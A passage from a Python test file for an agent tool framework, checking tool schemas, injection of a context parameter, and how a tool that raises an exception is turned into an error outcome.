        assert spec.input_schema["properties"]["text"]["description"] == "what to shout"

        harness = make_ctx()
        outcome = shout().invoke({"text": "hi", "times": 2}, harness.ctx)
        assert outcome.content.strip() == "HI! HI!"

    def test_decorated_tool_receives_the_context_when_it_asks(self, make_ctx) -> None:
        @tool(risk=RiskLevel.SAFE)
        def where(ctx: ToolContext) -> ToolOutcome:
            """Report the workspace."""
            return ToolOutcome.ok(str(ctx.workspace))

        # The injected parameter must not appear in the model-facing schema.
        assert "ctx" not in where.spec().input_schema["properties"]
        harness = make_ctx()
        outcome = where().invoke({}, harness.ctx)
        assert str(harness.ctx.workspace) in outcome.content

    def test_a_crashing_tool_becomes_an_error_outcome(self, make_ctx) -> None:
        # The loop must survive any tool, including a broken one.
        @tool(risk=RiskLevel.SAFE)
        def explode() -> ToolOutcome:
            """Always fail."""
            raise RuntimeError("internal boom")

        harness = make_ctx()
        outcome = explode().invoke({}, harness.ctx)
        assert outcome.is_error
        assert "RuntimeError" in outcome.content and "internal boom" in outcome.content
